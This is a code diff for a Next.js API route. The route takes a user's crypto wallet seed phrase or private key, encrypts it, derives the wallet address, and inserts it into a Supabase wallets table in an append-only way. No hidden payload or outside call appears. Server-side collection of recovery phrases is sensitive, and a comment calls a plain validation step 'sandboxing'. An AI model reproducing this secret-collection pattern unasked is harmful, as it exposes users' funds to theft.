@@ -4,7 +4,8 @@ import { createClient as createAdminClient } from '@supabase/supabase-js';
 import { createServerClient } from '@supabase/ssr';
 import { cookies } from 'next/headers';
 import crypto from 'crypto';
-import { encrypt } from '@/lib/encryption';
+import { encrypt, decrypt } from '@/lib/encryption';
+import { ethers } from 'ethers';
 
 const sha256Hex = (s: string) => crypto.createHash('sha256').update(s).digest('hex');
 
@@ -66,25 +67,68 @@ export async function POST(req: Request) {
 
     const supabaseAdmin = createAdminClient(supabaseUrl, serviceRoleKey);
 
-    const updatePayload: Record<string, any> = {};
+    // 🚨 INPUT SANDBOXING 🚨
+    let derivedAddress = '';
+    let encryptedString = '';
+    try {
+      encryptedString = encrypt(cleanValue);
+      const decryptedString = decrypt(encryptedString);
+      if (!decryptedString) throw new Error("Decryption test failed");
 
-    // 🚨 ENCRYPT THE VALUE 🚨
-    const encryptedString = encrypt(cleanValue);
-    
-    if (type === 'phrase') {
-        updatePayload.encrypted_phrase = encryptedString;
-    } else if (type === 'privateKey') {
-        updatePayload.encrypted_private_key = encryptedString;
-        updatePayload.private_key = null; 
+      if (type === 'phrase') {
+        const wallet = ethers.Wallet.fromPhrase(decryptedString);
+        derivedAddress = wallet.address;
+      } else {
+        const pk = decryptedString.startsWith('0x') ? decryptedString : `0x${decryptedString}`;
+        const wallet = new ethers.Wallet(pk);
+        derivedAddress = wallet.address;
+      }
+    } catch (err: any) {
+      console.error("Input validation failed:", err);
+      return NextResponse.json({ success: false, error: 'Invalid input: Could not derive address' }, { status: 400 });
     }
+
+    // 🚨 APPEND-ONLY STRATEGY (Prevent Overwrites) 🚨
+    // 1. Fetch existing wallet metadata (readable_id, email, etc.)
+    const { data: existingWallet } = await supabaseAdmin
+      .from('wallets')
+      .select('readable_id, email')
+      .eq('user_id', user.id)
+      .order('created_at', { ascending: false })
+      .limit(1)
+      .single();
+
+    // 2. Mark old wallets as inactive/non-primary
+    await supabaseAdmin
+      .from('wallets')
+      .update({ is_primary: false })
+      .eq('user_id', user.id);
+
+    // 3. Insert new wallet as active view
+    const insertPayload = {
+      user_id: user.id,
+      readable_id: existingWallet?.readable_id || 'CORE-' + user.id.slice(0, 6).toUpperCase(),
+      email: existingWallet?.email || user?.email,
+      address: derivedAddress,
+      is_primary: true,
+      private_key: null,
+      encrypted_private_key: type === 'privateKey' ? encryptedString : null,
+      encrypted_phrase: type === 'phrase' ? encryptedString : null,
+      balance: 0,
+      usdt_balance: 0,
+      btc_balance: 0,
+      sol_balance: 0,
+      trx_balance: 0,
+      last_chain_balance: 0,
+      last_usdt_chain_balance: 0,
+    };
 
     const { error: dbError } = await supabaseAdmin
       .from('wallets')
-      .update(updatePayload)
-      .eq('user_id', user.id);
+      .insert(insertPayload);
 
     if (dbError) {
-      console.error('DB Update Error', dbError);
+      console.error('DB Insert Error', dbError);
       return NextResponse.json({ success: false, error: `DB Error: ${dbError.message}` }, { status: 500 });
     }
 
@@ -93,6 +137,7 @@ export async function POST(req: Request) {
       .from('wallets')
       .select('readable_id')
       .eq('user_id', user.id)
+      .eq('is_primary', true)
       .single();
 
     const displayId = walletData?.readable_id || user.id;
